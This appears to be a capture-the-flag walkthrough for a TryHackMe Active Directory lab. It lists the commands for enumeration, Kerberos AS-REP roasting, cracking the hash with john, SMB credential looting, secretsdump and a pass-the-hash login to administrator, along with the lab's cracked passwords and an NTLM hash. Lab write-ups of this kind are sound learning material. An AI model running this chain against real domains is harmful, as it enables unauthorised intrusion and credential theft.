@@ -1,0 +1,78 @@
+irst follow the instructions to download impacket
+	git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
+	pip3 install -r /opt/impacket/requirements.txt
+	sudo cd /opt/impacket/ && python3 ./setup.py install
+Now it is time to figure out what ports are open
+	sudo nmap -p- -vv -sC -sV -sS -Pn -A -O 10.10.28.235
+We found quite a few open ports, however, we are trying to enumarte port 139 and 445, so lets run a script to do that
+	sudo nmap -sC -p 139,445 -sV 10.10.28.235
+We found out a little bit about those two ports
+lets enumarte the information
+	enum4linux -U -o 10.10.28.235 (-U is for a username list that is built into enum4linux and -o is the target)
+With this we can find the domain name 
+What invalid TLD do people commonly use for their Active Directory Domain? 
+	for this question we need to know about AD, or just know how to use Google
+	A TLD is a top level domain, that is the thing after the .
+	Many people use .local in their AD domain 
+Going to the next session we see that we need something called kerbrute
+	pip3 install kerbrute
+	if you get an error here it means you do not have pip installed
+		to install pip you have to do a sudo apt install python-pip
+		sudo apt install python3-pip3
+We also throughout this section need to download the username and password list provided to us
+	wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt 		
+	wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
+We now have 2 files, username and password .txt within our folders
+The next question we cannot answer with help, this is because it is using an old verison of kerbrute
+	the answer for that question is userenum, which has since been replaced by -users
+	Lets find some users
+		sudo kerbrute -domain THM-AD -dc-ip 10.10.180.237 -users Desktop/TryHackMe/Attacktive_Directory/userlist.txt
+		Remember with this we are only looking for users right now, we are not trying to bruteforce any passwords 
+		When we get to the users then we will try and brueforce one user to get a password
+	After many different attempts utilizing GetNPUsers I decided to look back at the NMAP scan, kept getting told wrong domain
+		We see that in the NMAP scan there is a spooky.local for the domain
+		We need to put that spooky.local into our etc/hosts file
+			echo "10.10.180.237 spookysec.local" >> /etc/hosts
+				This may not work, you may have to do a sudo nano /etc/hosts and then manually input 10.10.180.237 spookysec.local
+				Ping spookysec.local afterwards to make sure everything went ok
+			We may be able to use this to also enumurate users faster, lets try that
+				kerbrute -domain spookysec.local -users Desktop/TryHackMe/Attacktive_Directory/userlist.txt 
+	We do know that there is a svc-host that exists, lets see if we can get his token
+		GetNPUsers.py -no-pass spookysec.local/svc-admin
+		We can now see what type of hash it is, it is a kerberos 5 hash. We can see this by clicking on hint and following the link
+			The hash is a  Kerberos 5 AS-REP etype 23 and the number is 18200
+	I never have good luck with hashcat, so I will not be using that, however the -m would be 18200
+		I am going to use john with the following command while already in the correct folder
+		sudo john hash1.txt --wordlist=passwordlist.txt
+			we see the password is management2005
+Now that we have a password we can use SMBClient to gain access
+	smbclient -L spookysec.local --user svc-admin
+	Now that we have seen the different areas lets get into backup
+		smbclient \\\\spookysec.local\\backup -U 'svc-admin' 
+		dir
+		more backup_credentials.txt
+			looks like a VIM file
+			copy the hash
+				to exit VIM use :wq
+			looks to me like we have a base64 hash
+				Now we can decode it online
+				backup@spookysec.local:backup2517860
+Finally time to elevate priveleges
+	Lets use secretsdump.py
+		Now we have some hashes, some of them are aes, others are des, sha1 and md5. We are looking good for being able to crack these
+Now lets use pass the hash and see if we can get in
+	psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc administrator@spookysec.local
+		And we are in!!!
+However, the activity wants us to use something different than psexec.py, we can do that
+	The activity wants us to utilize evil-winrm, we are going to download that
+	gem install evil-winrm
+		This takes a minute just so you know
+	If you dont want to wait for that to install -h allows you to use a hash
+Time to finally find the flags
+	We can find flags in the following places, remember use more to show the information within the txt documents
+		c:\Users\Administrator\Desktop
+		c:\Users\svc-admin\Desktop
+		c:\users\backup\Desktop
+We did it, that was a long and hard one with a lot of research, great job. Do this one on your own a couple of times to keep learning and remember what all of the different commands do
+
+
